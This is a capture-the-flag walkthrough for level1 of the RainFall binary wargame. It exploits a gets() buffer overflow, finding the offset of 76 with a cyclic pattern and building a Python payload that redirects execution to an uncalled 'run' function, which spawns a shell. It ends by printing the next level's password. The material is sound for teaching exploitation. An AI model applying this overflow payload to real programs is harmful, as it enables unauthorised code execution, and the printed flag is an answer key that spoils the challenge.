 ▄▄▄▄                                    ▄▄▄▄                  ▄▄▄
 ▀▀██                                    ▀▀██                 █▀██
   ██       ▄████▄   ██▄  ▄██   ▄████▄     ██                   ██
   ██      ██▄▄▄▄██   ██  ██   ██▄▄▄▄██    ██                   ██
   ██      ██▀▀▀▀▀▀   ▀█▄▄█▀   ██▀▀▀▀▀▀    ██                   ██
   ██▄▄▄   ▀██▄▄▄▄█    ████    ▀██▄▄▄▄█    ██▄▄▄             ▄▄▄██▄▄▄
    ▀▀▀▀     ▀▀▀▀▀      ▀▀       ▀▀▀▀▀      ▀▀▀▀             ▀▀▀▀▀▀▀▀

objdump -d level1

There are two functions: <main> and <run>.

When we look at a disassembly of <main> with radare2:

r2 ./level1
aaa
s main
pdf # (or pdc, or pds)

We see thant run is never called.
This function is making a call to <system>.
We can suppose that this function is running /bin/sh, considering this is a CTF.
So we just have to make the program call this function.

The main function makes a call to gets, let's overflow the buffer:

https://wiremask.eu/tools/buffer-overflow-pattern-generator/

level1@RainFall:~$ gdb level1
(gdb) run
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5A
> 0x63413563 in ?? ()

According to the website: 0x63413563 => offset 76

Now, get the address of the "run" function:

(gdb) info function run
0x08048444  run

Reverse it (Little Endian):
44 84 04 08

Write 76 chars (the offset), then write the address of the run function.

level1@RainFall:~$ python -c "print 'A' * 76 + '\x44\x84\x04\x08'" > /tmp/f && cat /tmp/f - | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
